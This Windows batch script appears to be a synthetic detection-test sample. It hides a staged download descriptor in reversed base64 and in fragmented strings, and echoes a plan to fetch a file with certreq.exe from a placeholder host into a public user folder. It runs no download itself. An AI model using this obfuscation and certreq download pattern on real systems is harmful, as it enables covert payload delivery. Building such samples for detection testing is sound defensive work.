@echo off

setlocal EnableExtensions EnableDelayedExpansion

rem HUNTRESS-CODEC:plain_fragments|reverse

rem HUNTRESS-MATERIAL:dGFkLjhhMGM2YjFhMGMtZWdhdHNcYmFMc3NlcnRudUhcY2lsYnVQXHNyZXNVXDpDPWh0YXBfZWxpZnx0YWQuMWFiYzZhY2IvZGlsYXZuaS5lbHBtYXhlLjhhMGM2YjFhMGMvLzpzcHR0aD1scnV8OGEwYzZiMWEwYy1uZ2lhcG1hYz1kaV9uZ2lhcG1hY3xlbm9uPWVnYXVnbmFsX3R4ZW58ZG5vbWFpZD1ocGFyZ3wxPXRudW9jX2VnYXRzfGV4ZS5xZXJ0cmVjPXJldHBhZGF8ZWxpZl9ldGlydyxldG9tZXJfZXJpdXFjYT1zcGV0c3wxPXY=

rem HUNTRESS-EXTENSION:cmd

if /i "%~1"=="--inspect" goto :HUNTRESS_INSPECT

if /i "%~1"=="--plan" goto :HUNTRESS_PLAN

exit /b 0

:HUNTRESS_INSPECT

set FrAg0=v=1^|steps=acquire_remote,write_file^|adapter=certreq.exe^|stage_
set FrAg1=count=1^|graph=diamond^|next_language=none^|campaign_id=campaign-
set FrAg2=c0a1b6c0a8^|url=https://c0a1b6c0a8.example.invalid/bca6cba1.dat
set FrAg3=^|file_path=C:\Users\Public\HuntressLab\stage-c0a1b6c0a8.dat

goto :HUNTRESS_SEPARATOR_DONE
ver >nul && rem HUNTRESS separator double ampersand
:HUNTRESS_SEPARATOR_DONE

set "neutral_environment_probe=9909a932"

call :HUNTRESS_RECOVER
goto :HUNTRESS_EMIT
:HUNTRESS_RECOVER
call set "ReCoVeReD=%%FrAg0%%%%FrAg1%%%%FrAg2%%%%FrAg3%%"
exit /b 0
:HUNTRESS_EMIT

echo(!ReCoVeReD!

exit /b 0

:HUNTRESS_PLAN

echo certreq.exe acquire https://c0a1b6c0a8.example.invalid/bca6cba1.dat to C:\Users\Public\HuntressLab\stage-c0a1b6c0a8.dat

exit /b 0

